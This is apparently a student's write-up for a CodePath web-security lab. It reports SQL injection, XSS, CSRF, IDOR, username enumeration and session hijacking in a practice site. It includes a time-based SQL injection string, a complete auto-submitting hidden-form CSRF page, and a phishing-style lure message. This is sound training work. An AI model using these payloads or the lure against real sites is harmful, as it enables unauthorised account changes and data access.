# Codepath-Week-9

Time spent: 9 hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:

* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each color is vulnerable to only 2 of the 6 possible exploits. First discover which color has the specific vulnerability, then write a short description of how to exploit it, and finally demonstrate it using screenshots compiled into a GIF.

## Blue

Vulnerability #1: Session Hijacking/Fixation

Description: I performed session hijacking to verify this vulnerability. In one browser (Chrome), we logged in normally but then copied the current PHPSESSIONID using a tool I discovered. I then went to another browser (Microsoft Edge) which was NOT logged in and changed the PHPSESSIONID in this browser (using the same tool) to match the one we retrieved from the normally logged in browser.The result is that we were automatically logged into the system in the second browser without the need for a username or password.

<img src="SessionHijackingFixation.gif">

Vulnerability #2: SQL Injection

Description: I performed a SQL injection at the public/staff/salespeople/show.php?id=?? endpoint. The ?? was replaced with the following SQL syntax: ' OR SLEEP(5)=0--' (which becomes %27%20OR%20SLEEP(5)=0--%27 when encoded in a URL). This snippet forced the SQL query (and thus our entire request) to pause for 5 seconds, thus indicating a successful injection.

<img src="SQLINJECTION.gif">

## Green

Vulnerability #1: Username Enumeration

Description: Username enumeration can be performed when feedback from a web application provides hints as to whether or not a certain account exists. In the login screen of the green application, if the username is correct, but the password is wrong, the Log in was unsuccessful. message is bolded. However, if the username does not exist, this message is NOT bolded. In the following walkthrough, pperson, jmunroe99, and lbtables are the only valid usernames.

<img src="UsernameEnumeration.gif">

Vulnerability #2: Cross-Site Scripting (XSS)

Description: An user can input some Javascript in between a pair of <script> tags in the "Feedback" box of the "Contact Us" form. When an admin goes to his/her panel to check for any submitted forms, this Javascript is automatically executed.

<img src="CrossSiteScripting.gif">


## Red

Vulnerability #1: Insecure Direct Object Reference (IDOR)

Description: An IDOR vulnerability exists in the red application, where a user can see any account, including those accounts that have been effectively deactivated. We can use the public/salesperson.php?id=?? endpoint where ?? is the ID of the salesperson. In this example, we can put in the ID (11) of "Lazy Lazyman," who was apparently fired for stealing. This attack is made even easier by the fact that the ID numbers of all salespeople can be guessed since they are low numbers and are in numerical order. Thus, an attacker could simply guess ID numbers until they reach a deactivated account. The blue and green applications mitigate this by simply redirecting the user back to the list of salespeople with absolutely no feedback if a non-existent or deactivated ID is provided.

<img src="InsecureDirectObjectReference.gif">

Vulnerability #2: Cross-Site Request Forgery (CSRF)

Description: Incomplete!!: To perform a CSRF attack, we can trick an admin into clicking a link to a "blank" page that contains a hidden form. The page's source looks like the following:

<html>
  <head>
    <title>A Totally Blank Page</title>
  </head>
  <body onload="document.CSRF.submit()">
	<form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=5" method="post" style="display: none;" name='CSRF' target="res">
	    <input type="text" name="first_name" value="Ken Barker" />
      	<input type="text" name="last_name" value="WAS HACKED" />
      	<input type="text" name="phone" value="555-352-9654" />
      	<input type="text" name="email" value="kbarker@HACKED.com" />
	</form>
    <iframe name="res" style="display: none;"></iframe>
  </body>
</html>

<!-- file:///C:/Users/Student/OneDrive/Desktop/random_form.html -->

<!--
	Not a Hacker
	not.a.hacker@example.com

	Go here to get claim your money! -> file:///C:/Users/Student/OneDrive/Desktop/random_form.html
-->

It contains all of the information necessary to modify Ken Barker's salesperson profile (id=5) and will be successfully submitted as soon as a logged in user (i.e. an admin) loads the page.

<img src="CrossSite_Request_Forgery.gif">


## Notes
